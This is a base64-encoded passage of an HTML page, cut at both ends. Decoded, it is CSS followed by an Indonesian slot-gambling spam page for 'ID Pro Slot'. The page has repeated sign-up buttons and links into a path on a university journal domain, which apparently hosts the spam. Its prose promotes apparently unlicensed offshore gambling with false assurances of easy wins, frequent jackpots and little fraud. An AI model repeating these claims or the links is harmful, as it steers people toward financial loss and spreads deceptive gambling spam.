dpZHRoOiAxMDAlCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC5jb2wtbWQtMyB7CiAgICAgICAgICAgICAgICB3aWR0aDogMjUlCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIEBtZWRpYSAobWluLXdpZHRoOjEyMDBweCkgewogICAgICAgICAgICAuY29sLWxnLTEyIHsKICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC5jb2wtbGctMTIgewogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCUKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgLmJ0biB7CiAgICAgICAgICAgIGRpc3BsYXk6IGdyaWQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDZweCAxMnB4OwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAwOwogICAgICAgICAgICBmb250LXNpemU6IGxhcmdlOwogICAgICAgICAgICBmb250LXdlaWdodDogNDAwOwogICAgICAgICAgICBsaW5lLWhlaWdodDogMS40Mjg1NzE0MzsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICB3aGl0ZS1zcGFjZTogbm93cmFwOwogICAgICAgICAgICB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOwogICAgICAgICAgICAtbXMtdG91Y2gtYWN0aW9uOiBtYW5pcHVsYXRpb247CiAgICAgICAgICAgIHRvdWNoLWFjdGlvbjogbWFuaXB1bGF0aW9uOwogICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgICAgIC13ZWJraXQtdXNlci1zZWxlY3Q6IG5vbmU7CiAgICAgICAgICAgIC1tb3otdXNlci1zZWxlY3Q6IG5vbmU7CiAgICAgICAgICAgIC1tcy11c2VyLXNlbGVjdDogbm9uZTsKICAgICAgICAgICAgdXNlci1zZWxlY3Q6IG5vbmU7CiAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHRyYW5zcGFyZW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICAgICAgfQoKICAgICAgICAuYnRuOmFjdGl2ZTpmb2N1cywKICAgICAgICAuYnRuOmZvY3VzIHsKICAgICAgICAgICAgb3V0bGluZTogNXB4IGF1dG8gLXdlYmtpdC1mb2N1cy1yaW5nLWNvbG9yOwogICAgICAgICAgICBvdXRsaW5lLW9mZnNldDogLTJweAogICAgICAgIH0KCiAgICAgICAgLmJ0bjpmb2N1cywKICAgICAgICAuYnRuOmhvdmVyIHsKICAgICAgICAgICAgY29sb3I6ICNjMjFhMWE7CiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZQogICAgICAgIH0KCiAgICAgICAgLmJ0bjphY3RpdmUgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiBub25lOwogICAgICAgICAgICBvdXRsaW5lOiAwOwogICAgICAgICAgICAtd2Via2l0LWJveC1zaGFkb3c6IGluc2V0IDAgM3B4IDVweCByZ2JhKDksIDg3LCAyMzMsIDAuOTg2KTsKICAgICAgICAgICAgYm94LXNoYWRvdzogaW5zZXQgMCAzcHggNXB4IHJnYmEoMjA2LCAyMywgMjMsIDAuOTg2KQogICAgICAgIH0KCiAgICAgICAgLmJ0bi1wcmltYXJ5IHsKICAgICAgICAgICAgY29sb3I6ICNlYmViZWI7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICBmb250LXdlaWdodDogNzAwOwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgICAgIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjogI2ViZWJlYjsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzgyMDlCRgogICAgICAgIH0KCiAgICAgICAgLmJ0bi1wcmltYXJ5OmZvY3VzIHsKICAgICAgICAgICAgY29sb3I6ICNlYmViZWI7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyODYwOTA7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjogI2ViZWJlYgogICAgICAgIH0KCiAgICAgICAgLmJ0bi1wcmltYXJ5OmhvdmVyIHsKICAgICAgICAgICAgY29sb3I6ICM4MjA5QkY7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlYmViZWI7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjogI2U3ZWIwZQogICAgICAgIH0KCiAgICAgICAgLmJ0bi1wcmltYXJ5OmFjdGl2ZSB7CiAgICAgICAgICAgIGNvbG9yOiAjZWJlYmViOwogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjg2MDkwOwogICAgICAgICAgICBib3JkZXItY29sb3I6ICMyMDRkNzQKICAgICAgICB9CgogICAgICAgIC5idG4tcHJpbWFyeTphY3RpdmU6Zm9jdXMsCiAgICAgICAgLmJ0bi1wcmltYXJ5OmFjdGl2ZTpob3ZlciB7CiAgICAgICAgICAgIGNvbG9yOiAjZWJlYmViOwogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjA0ZDc0OwogICAgICAgICAgICBib3JkZXItY29sb3I6ICNlYmViZWIKICAgICAgICB9CgogICAgICAgIC5idG4tcHJpbWFyeTphY3RpdmUgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiBub25lCiAgICAgICAgfQoKICAgICAgICAuY29udGFpbmVyOmFmdGVyLAogICAgICAgIC5jb250YWluZXI6YmVmb3JlLAogICAgICAgIC5yb3c6YWZ0ZXIsCiAgICAgICAgLnJvdzpiZWZvcmUgewogICAgICAgICAgICBkaXNwbGF5OiB0YWJsZTsKICAgICAgICAgICAgY29udGVudDogIiAiCiAgICAgICAgfQoKICAgICAgICAuY29udGFpbmVyOmFmdGVyLAogICAgICAgIC5yb3c6YWZ0ZXIgewogICAgICAgICAgICBjbGVhcjogYm90aAogICAgICAgIH0KCiAgICAgICAgLnRpdGxlIHsKICAgICAgICAgICAgZm9udC1zaXplOiAyOHB4OwogICAgICAgICAgICBmb250LXdlaWdodDogNzAwOwogICAgICAgICAgICBwYWRkaW5nOiAyOHB4IDA7CiAgICAgICAgICAgIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7CiAgICAgICAgICAgIGJvcmRlci10b3A6IDFweCBzb2xpZCAjODIwOUJGOwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgIzgyMDlCRgogICAgICAgIH0KCiAgICAgICAgLmluZm8gewogICAgICAgICAgICB0ZXh0LWFsaWduOiBsZWZ0OwogICAgICAgICAgICBsaXN0LXN0eWxlOiBzcXVhcmU7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweCA4cHggOHB4IDQwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMTIsIDEyLCAxMiwgMC45MTgpCiAgICAgICAgfQoKICAgICAgICBoMSwKICAgICAgICBoMiwKICAgICAgICBoMyB7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgIGNvbG9yOiAjQkE1OUVBOwogICAgICAgICAgICBmb250LWZhbWlseTogYXJpYWwKICAgICAgICB9CgogICAgICAgIGE6Zm9jdXMgewogICAgICAgICAgICBjb2xvcjogcHVycGxlOwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmUKICAgICAgICB9CgogICAgICAgIC5ibG9jay1mYWN0cyB7CiAgICAgICAgICAgIG1hcmdpbjogMThweCA4cHg7CiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDAwMDA0MQogICAgICAgIH0KCiAgICAgICAgLmJveC1mYWN0cyB7CiAgICAgICAgICAgIGRpc3BsYXk6IHRhYmxlOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogbGVmdDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgICAgICBsaW5lLWhlaWdodDogMjZweDsKICAgICAgICAgICAgYm9yZGVyLWJvdHRvbTogMXB4IGRhc2hlZCAjODIwOUJGCiAgICAgICAgfQoKICAgICAgICAuYm94LWZhY3RzIHNwYW4gewogICAgICAgICAgICBkaXNwbGF5OiB0YWJsZS1jZWxsOwogICAgICAgICAgICB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlCiAgICAgICAgfQoKICAgICAgICAuYm94LWZhY3RzIC5yZXZpZXcgewogICAgICAgICAgICBjb2xvcjogI0JBNTlFQTsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDcwMDsKICAgICAgICAgICAgd2lkdGg6IDMzJTsKICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDE2cHgKICAgICAgICB9CgogICAgICAgIC5jb2wtbGctMTIsCiAgICAgICAgLmNvbC1tZC0xMiwKICAgICAgICAuY29sLW1kLTMsCiAgICAgICAgLmNvbC1tZC00LAogICAgICAgIC5jb2wtc20tMTIsCiAgICAgICAgLmNvbC1zbS0zLAogICAgICAgIC5jb2wteHMtMTIsCiAgICAgICAgLmNvbC14cy02IHsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICBtaW4taGVpZ2h0OiAxcHg7CiAgICAgICAgICAgIHBhZGRpbmctcmlnaHQ6IDE1cHg7CiAgICAgICAgICAgIHBhZGRpbmctbGVmdDogMTVweDsKICAgICAgICAgICAgZm9udC1mYW1pbHk6IGNvdXJpZXI7CiAgICAgICAgfQoKICAgICAgICAuY29sLXhzLTEyLAogICAgICAgIC5jb2wteHMtNiB7CiAgICAgICAgICAgIGZsb2F0OiBsZWZ0CiAgICAgICAgfQoKICAgICAgICAuY29sLXhzLTEyIHsKICAgICAgICAgICAgd2lkdGg6IDEwMCUKICAgICAgICB9CgogICAgICAgIC5jb2wteHMtNiB7CiAgICAgICAgICAgIHdpZHRoOiA1MCUKICAgICAgICB9CgogICAgICAgIEBtZWRpYSAobWluLXdpZHRoOjc2OHB4KSB7CgogICAgICAgICAgICAuY29sLXNtLTEyLAogICAgICAgICAgICAuY29sLXNtLTMgewogICAgICAgICAgICAgICAgZmxvYXQ6IGxlZnQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLmNvbC1zbS0xMiB7CiAgICAgICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBjb3VyaWVyOwogICAgICAgICAgICB9CgogICAgICAgICAgICAuY29sLXNtLTMgewogICAgICAgICAgICAgICAgd2lkdGg6IDI1JQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBAbWVkaWEgKG1pbi13aWR0aDo5OTJweCkgewoKICAgICAgICAgICAgLmNvbC1tZC0xMiwKICAgICAgICAgICAgLmNvbC1tZC0zLAogICAgICAgICAgICAuY29sLW1kLTQgewogICAgICAgICAgICAgICAgZmxvYXQ6IGxlZnQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLmNvbC1tZC0xMiB7CiAgICAgICAgICAgICAgICB3aWR0aDogMTAwJQogICAgICAgICAgICB9CgogICAgICAgICAgICAuY29sLW1kLTQgewogICAgICAgICAgICAgICAgd2lkdGg6IDMzLjMzMzMzMzMzJQogICAgICAgICAgICB9CgogICAgICAgICAgICAuY29sLW1kLTMgewogICAgICAgICAgICAgICAgd2lkdGg6IDI1JQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBAbWVkaWEgKG1pbi13aWR0aDoxMjAwcHgpIHsKICAgICAgICAgICAgLmNvbC1sZy0xMiB7CiAgICAgICAgICAgICAgICBmbG9hdDogbGVmdAogICAgICAgICAgICB9CgogICAgICAgICAgICAuY29sLWxnLTEyIHsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC5wa3YtZ2FtZXMgewogICAgICAgICAgICBsaXN0LXN0eWxlOiBub25lOwogICAgICAgICAgICBwYWRkaW5nOiAwIDE4cHgKICAgICAgICB9CgogICAgICAgIC5iYW5rLW9mZmxpbmUgcCB7CiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyCiAgICAgICAgfQoKICAgICAgICAuYmFuay1sb2dvIHsKICAgICAgICAgICAgcGFkZGluZzogMTBweCAwOwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXIKICAgICAgICB9CgogICAgICAgIC8qISBDU1MgVXNlZCBrZXlmcmFtZXMgKi8KICAgICAgICBALXdlYmtpdC1rZXlmcmFtZXMgLWFtcC1zdGFydCB7CiAgICAgICAgICAgIGZyb20gewogICAgICAgICAgICAgICAgdmlzaWJpbGl0eTogaGlkZGVuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHRvIHsKICAgICAgICAgICAgICAgIHZpc2liaWxpdHk6IHZpc2libGUKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgQC1tb3ota2V5ZnJhbWVzIC1hbXAtc3RhcnQgewogICAgICAgICAgICBmcm9tIHsKICAgICAgICAgICAgICAgIHZpc2liaWxpdHk6IGhpZGRlbgogICAgICAgICAgICB9CgogICAgICAgICAgICB0byB7CiAgICAgICAgICAgICAgICB2aXNpYmlsaXR5OiB2aXNpYmxlCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIEAtbXMta2V5ZnJhbWVzIC1hbXAtc3RhcnQgewogICAgICAgICAgICBmcm9tIHsKICAgICAgICAgICAgICAgIHZpc2liaWxpdHk6IGhpZGRlbgogICAgICAgICAgICB9CgogICAgICAgICAgICB0byB7CiAgICAgICAgICAgICAgICB2aXNpYmlsaXR5OiB2aXNpYmxlCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIEAtby1rZXlmcmFtZXMgLWFtcC1zdGFydCB7CiAgICAgICAgICAgIGZyb20gewogICAgICAgICAgICAgICAgdmlzaWJpbGl0eTogaGlkZGVuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHRvIHsKICAgICAgICAgICAgICAgIHZpc2liaWxpdHk6IHZpc2libGUKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgQGtleWZyYW1lcyAtYW1wLXN0YXJ0IHsKICAgICAgICAgICAgZnJvbSB7CiAgICAgICAgICAgICAgICB2aXNpYmlsaXR5OiBoaWRkZW4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgdG8gewogICAgICAgICAgICAgICAgdmlzaWJpbGl0eTogdmlzaWJsZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgPC9zdHlsZT4KPC9oZWFkPgoKPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgdGhlLW1haW4tY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJtYWluLWJvZHkiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTQgY29sLXhzLTEyIj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTQgY29sLXhzLTEyIiBzdHlsZT0ibWFyZ2luLXRvcDoyOHB4IiBpdGVtc2NvcGU9Iml0ZW1zY29wZSIgaXRlbXR5cGU9Imh0dHA6Ly9zY2hlbWEub3JnL0JyYW5kIj4KICAgICAgICAgICAgICAgICAgICA8YW1wLWltZyBzcmM9Imh0dHBzOi8vaS5pYmIuY28vMVhqeThLYy9sb2dvLmpwZyIgdGl0bGU9IklEIFBybyBTbG90IiBpdGVtcHJvcD0ibG9nbyIgd2lkdGg9IjI3NyIgaGVpZ2h0PSIxMTAiIGxheW91dD0icmVzcG9uc2l2ZSIgc3R5bGU9Im1hcmdpbjphdXRvO21heC13aWR0aDoxNTBweCIgYWx0PSJJRCBQcm8gU2xvdCB0b2dlbCA0ZCB0b2dlbCBvbmxpbmUgdGVybGVuZ2thcCAyMDIzIj4KICAgICAgICAgICAgICAgICAgICAgICAgPG1ldGEgaXRlbXByb3A9Im5hbWUiIGNvbnRlbnQ9IklEIFBybyBTbG90Ij4KICAgICAgICAgICAgICAgICAgICA8L2FtcC1pbWc+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC00IGNvbC14cy0xMiI+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiBjb2wteHMtMTIiPgoKICAgICAgICAgICAgICAgICAgICA8aDEgY2xhc3M9InRpdGxlIiBhbGlnbj0iY2VudGVyIj4yMCBEYWZ0YXIgU2l0dXMgSUQgUHJvIFNsb3QgR2Fjb3IgTWF4d2luIEdhbXBhbmcgTWVuYW5nIEhhcmkgSW5pPC9oMT4KICAgICAgICAgICAgICAgICAgICA8cCBpdGVtcHJvcD0idGV4dCIgYWxpZ249ImNlbnRlciI+PGEgaHJlZj0iaHR0cHM6Ly9oZXlsaW5rLm1lL3NsdGdjcjIwMjMvIiByZWw9Im5vb3BlbmVyIiB0aXRsZT0iZGFmdGFyIiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiB0YXJnZXQ9Il9ibGFuayI+RGFmdGFyICZhbXA7IExvZ2luPC9hPiA8L3A+CiAgICAgICAgICAgICAgICAgICAgPHA+PGFtcC1pbWcgc3JjPSJodHRwczovL2kuaWJiLmNvL3ZZamRXZ3IvQ29weS1vZi1TYWxpbmFuLWRhcmktUFdVLU9uZS0zMjQwLTEwODAtcGlrc2VsLTEucG5nIiB0aXRsZT0iMjAgRGFmdGFyIFNpdHVzIElEIFBybyBTbG90IEdhY29yIE1heHdpbiBHYW1wYW5nIE1lbmFuZyBIYXJpIEluaSIgaXRlbXByb3A9ImxvZ28iIHdpZHRoPSIxMDAwIiBoZWlnaHQ9IjMwMCIgbGF5b3V0PSJyZXNwb25zaXZlIiBzdHlsZT0ibWFyZ2luOmF1dG87bWF4LXdpZHRoOjEyMDBweCIgYWx0PSJJRCBQcm8gU2xvdCB0b2dlbCA0ZCB0b2dlbCBvbmxpbmUgdGVybGVuZ2thcCAyMDIzIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxtZXRhIGl0ZW1wcm9wPSJuYW1lIiBjb250ZW50PSIyMCBEYWZ0YXIgU2l0dXMgSUQgUHJvIFNsb3QgR2Fjb3IgTWF4d2luIEdhbXBhbmcgTWVuYW5nIEhhcmkgSW5pIj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9hbXAtaW1nPjwvcD4KICAgICAgICAgICAgICAgICAgICA8cCBpdGVtcHJvcD0idGV4dCIgYWxpZ249ImNlbnRlciI+PGEgaHJlZj0iaHR0cHM6Ly9oZXlsaW5rLm1lL3NsdGdjcjIwMjMvIiByZWw9Im5vb3BlbmVyIiB0aXRsZT0iZGFmdGFyIiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiB0YXJnZXQ9Il9ibGFuayI+TElWRUNIQVQgSUQgUHJvIFNsb3Q8L2E+PC9wPgogICAgICAgICAgICAgICAgICAgIDxwIGl0ZW1wcm9wPSJ0ZXh0IiBhbGlnbj0iY2VudGVyIj48YSBocmVmPSJodHRwczovL2hleWxpbmsubWUvc2x0Z2NyMjAyMy8iIHJlbD0ibm9vcGVuZXIiIHRpdGxlPSJkYWZ0YXIiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiIHRhcmdldD0iX2JsYW5rIj5BbHRlcm5hdGlmIElEIFBybyBTbG90PC9hPjwvcD4KICAgICAgICAgICAgICAgICAgICA8cCBpdGVtcHJvcD0idGV4dCIgYWxpZ249ImNlbnRlciI+PGEgaHJlZj0iaHR0cHM6Ly9oZXlsaW5rLm1lL3NsdGdjcjIwMjMvIiByZWw9Im5vb3BlbmVyIiB0aXRsZT0iZGFmdGFyIiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiB0YXJnZXQ9Il9ibGFuayI+SUQgUHJvIFNsb3Q8L2E+PC9wPgogICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8IS0tIFBsYXRmb3JtIC0tPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC0xMiI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJibG9jay1mYWN0cyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYm94LWZhY3RzIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InJldmlldyI+TkFNQSBTSVRVUzo8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbmZvIj48YSBocmVmPSJodHRwczovL2p1cm5hbGZzaC51aW5zYnkuYWMuaWQvcHVibGljLy0vaWQtcHJvLXNsb3QvIiByZWw9Im5vb3BlbmVyIiB0aXRsZT0iSUQgUHJvIFNsb3QiIHRhcmdldD0iX2JsYW5rIj5JRCBQcm8gU2xvdDwvYT48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYm94LWZhY3RzIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InJldmlldyI+UExBVEZPUk1TOjwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImluZm8iPldpbmRvd3MsIFRhYmxldCwgTWFjLCBpT1MsIEFuZHJvaWQ8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYm94LWZhY3RzIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InJldmlldyI+TUFUQSBVQU5HOjwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImluZm8iPlJVUElBSCAoSURSKTwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJib3gtZmFjdHMiPgogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0icmV2aWV3Ij5CT05VUzo8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbmZvIj4xMDAlPC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJveC1mYWN0cyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJyZXZpZXciPkRFUE9TSVQ6PC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaW5mbyI+QkFOSyBMT0tBTCwgRS1NT05FWSAmIFFSSVMgRExMPC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJveC1mYWN0cyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJyZXZpZXciPkNVU1RPTUVSIFNVUFBPUlQ6PC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaW5mbyI+RS1NQUlMLCBMSVZFIENIQVQsIFdIQVRTQVBQIERMTDwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgPCEtLSBnYW1lcyAtLT4KICAgICAgICAgICAgICAgICAgICA8IS0tIAogICAgICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0icGt2LWdhbWVzIj4KCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC0xMiIgYWxpZ249ImNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIiIGFsaWduPSJjZW50ZXIiPgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC0xMiIgYWxpZ249ImNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgICAgICAtLT4KICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CgogICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS0xMiI+CgogICAgICAgICAgICAgICAgPCEtLSBQQVJBR1JBUEggMSBURU1QTEFURQogICAgICAgICAgICAgICAgPGgyIGNsYXNzPSJ0aXRsZSIgYWxpZ249ImNlbnRlciI+PC9oMj4KICAgICAgICAgICAgICAgIDxwIGl0ZW1wcm9wPSJ0ZXh0Ij4KCiAgICAgICAgICAgICAgICA8L3A+CgogICAgICAgICAgICAgICAgIC0tPgoKICAgICAgICAgICAgICAgIDxoMSBjbGFzcz0idGl0bGUiIGFsaWduPSJjZW50ZXIiPlNpdHVzIElEIFBybyBTbG90IEdhY29yIE1heHdpbiBWSVAgWDUwMCBUZXJwZXJjYXlhIEluZG9uZXNpYTwvaDE+CgogICAgICAgICAgICAgICAgPHA+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiA0MDA7Ij5TaXR1cyBzZXJ2ZXIgPC9zcGFuPjxhIGhyZWY9Imh0dHBzOi8vanVybmFsZnNoLnVpbnNieS5hYy5pZC9wdWJsaWMvLS9pZC1wcm8tc2xvdC8iPjxiPklEIFBSTyBTTE9UPC9iPjwvYT48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPiB5YW5nIGthbWkgYmVyaWthbiBkaWF0YXMgbWVydXBha2FuIHNpdHVzIHBpbGloYW4gc2xvdCB0ZXJiYWlrIHlhbmcgcGFzdGkgYmVyYXNhbCBkYXJpIGthbGFuZ2FuIFZJUCBkYW4gZGlzZWRpYWthbiBvbGVoIHBhcmEgcGVjaW50YSBzbG90IG9ubGluZSBkaSBpbmRvbmVzaWEgZGltYW5hIHBlcm1haW5hbiBzbG90IG9ubGluZSB5YW5nIGFrYW4gYW5kYSBtYWlua2FuIGluaSBtdWRhaCB1bnR1ayBtZW5hbmcgZGFuIG1lbmRhcGF0a2FuIGphY2twb3QgeWFuZyBzZXJpbmcgZGkgZGFwYXRrYW4uIGthc3VzLiBzZWJ1dCBzYWphIG1lbWJlcmlrYW4gc3ByZWFkIGRhbGFtIGhhbCBwZW1haW4sIHBlbWFpbiBzbG90IG9ubGluZSBkaSBpbmRvbmVzaWEgZGFuIHdlYnNpdGUgeWFuZyBrYW1pIHNlZGlha2FuIHRpZGFrIGJlcm9wZXJhc2kgZGkgaW5kb25lc2lhIHlhbmcgcGFzdGlueWEgZGkgbHVhciBuZWdlcmkgZGVuZ2FuIHRpbmdrYXQgcGVuaXB1YW4gcGVybWFpbmFuIHNsb3Qgb25saW5lIHlhbmcgc2FuZ2F0IHJlbmRhaCBzZWhpbmdnYSBhbmRhIGJpc2EgbWVyYXNha2FuIGtlbWVuYW5nYW4gc2V0aWFwIGhhcmlueWEuPC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogNDAwOyI+TWFzaWggbWVuY2FyaSBzaXR1cyBzbG90IG9ubGluZSB0ZW50dW55YSBoYWwgaW5pIHRpZGFrIHN1bGl0LiBQYWRhIHVtdW1ueWEgYWdlbiA8L3NwYW4+PGEgaHJlZj0iaHR0cHM6Ly9qdXJuYWxmc2gudWluc2J5LmFjLmlkL3B1YmxpYy8tL2lkLXByby1zbG90LyI+PGI+SUQgUFJPPC9iPjwvYT48c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDQwMDsiPiB0ZXJiYWlrIGhhbnlhIG1lbnllZGlha2FuIHRhcnVoYW4gZGVuZ2FuIG1lbmdndW5ha2FuIHVhbmcgYXNsaSwgbmFtdW4ga2FtaSBqdWdhIG1lbnllZGlha2FuIHNsb3QgZGVtby4gTmFtdW4gc2VpcmluZyBwZXJrZW1iYW5nYW4gemFtYW4sIGFnZW4gc2xvdCBvbmxpbmUgbWVuY2lwdGFrYW4gc2lzdGVtIHlhbmcgYmVyYmVkYS4gTXVsYWkgZGFyaSBzaXN0ZW0gcGVybWFpbmFuIGRhbiBqdWdhIHNpc3RlbSB1bnR1ayBtZW11ZGFoa2FuIHRyYW5zYWtzaSBwYXJhIHBlbWFpbiBzbG90IG9ubGluZS4gQWRhIGJlYmVyYXBhIHBpbGloYW4gcGVybWFpbmFuIHNsb3Qgb25saW5lIHlhbmcgbXVkYWggbWVuYW5nIHlhbmcgdGVyc2VkaWEgc2FhdCBpbmk6PC9zcGFuPjwvcD4KICAgICAgICAgICAgICAgIDxwPjxiPjwvYj48L3A+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpIGFyaWEt